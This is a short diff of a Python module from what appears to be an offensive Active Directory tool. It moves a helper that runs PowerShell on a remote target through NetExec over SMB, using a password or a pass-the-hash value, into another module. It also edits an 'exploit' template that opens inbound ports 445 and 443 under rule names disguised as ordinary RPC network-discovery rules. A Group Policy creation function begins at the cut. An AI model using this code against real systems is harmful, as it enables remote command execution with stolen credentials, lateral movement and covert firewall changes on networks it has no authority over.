@@ -5,6 +5,7 @@ import re
 from typing import Optional, Dict
 from colored import Fore
 from ..Modules.utils import get_ip
+from ..Modules.run_modules import execute_powershell
 
 def get_head(name: str, oppsec: Optional[bool] = True) -> str:
     my_ip = get_ip()
@@ -28,29 +29,11 @@ def get_head(name: str, oppsec: Optional[bool] = True) -> str:
             $firewall_on = Test-Connection {ip} -Count 1 -Quiet
             if ($firewall_on){{
                 New-NetFirewallRule -DisplayName "RPC Endpoint Mapper" -Direction Inbound -Action Allow -Protocol TCP -LocalPort 445 -Description "Core RPC service" -Group "Network Discovery"
-                New-NetFirewallRule -DisplayName "RPC Dynamic Ports" -Direction Inbound -Action Allow -Protocol TCP -LocalPort 443 -Description "Inbound rule for the Remote Procedure Call service." -Group "Network Discovery"
+                New-NetFirewallRule -DisplayName "RPC Dynamic Ports" -Direction Inbound -Action Allow -Protocol TCP -LocalPort 443 -Description "Inbound rule for the Remote Procedure Call service" -Group "Network Discovery"
             }}
             """,
     }   
     return exploit_heads.get(name)
-    
-def execute_powershell(target: str, username: str, password: str, domain: str, ps_command: str, use_hash: bool = False) -> tuple[bool,str]:
-    cmd = ['nxc', 'smb', target, '-u', username, '-d', domain]
-    if use_hash:
-        cmd.extend(['-H', password])
-    else:
-        cmd.extend(['-p', password])
-    cmd.extend(['-X', ps_command])
-
-    try:
-        result = subprocess.run(cmd, capture_output=True, text=True)
-
-        output = result.stdout + result.stderr
-        success = result.returncode == 0
-        return success, output
-    
-    except Exception as e:
-        return False, f"Error executing command: {str(e)}"
     
 def create_gpo(target: str, username: str, password: str, domain: str, gpo_name: str, use_hash: bool = False) -> Optional[Dict[str, str]]:
     ps_command = f'''
